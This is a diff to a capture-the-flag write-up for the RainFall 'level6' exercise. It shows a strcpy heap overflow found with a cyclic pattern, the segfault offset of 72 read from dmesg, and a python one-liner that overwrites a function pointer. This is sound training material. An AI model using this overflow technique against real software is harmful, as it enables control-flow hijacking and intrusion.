@@ -70,14 +70,17 @@ In the main function there are 2 calls to malloc and 1 to strcpy
 We know that strcpy is vulnerable to overflows so we can start there.
 First we need to find the offset to make strcpy overflowed.
 
-/level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+./level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
+Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8A
+e9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 Segmentation fault (core dumped)
 
 We segfault of course, but we need to know where :
 
 level6@RainFall:~$ dmesg
 ...
-[ 5062.423491] level6[3006]: segfault at 41346341 ip 41346341 sp bffff56c error 14
+[ 5062.423491] level6[3006]: segfault at 41346341 ip 41346341 sp bffff56c error
+14
 
 With the help of a pattern generator online we do know that the overflow 
 happenes at 72, let's confirm that :
@@ -90,7 +93,8 @@ Segmentation fault (core dumped)
 Indeed it's the case.
 Let's take a look again at the main function, after the call to strcpy
 there is a pointer to function call to m
-Thanks to the overflow we can overwrite that call, and change it to the address of n
+Thanks to the overflow we can overwrite that call, and change it to the address
+of n
 We can test this by calling first m like the program does originally:
 
 level6@RainFall:~$ ./level6 $(python -c 'print "X" * 72 + "\x68\x84\x04\x08"')
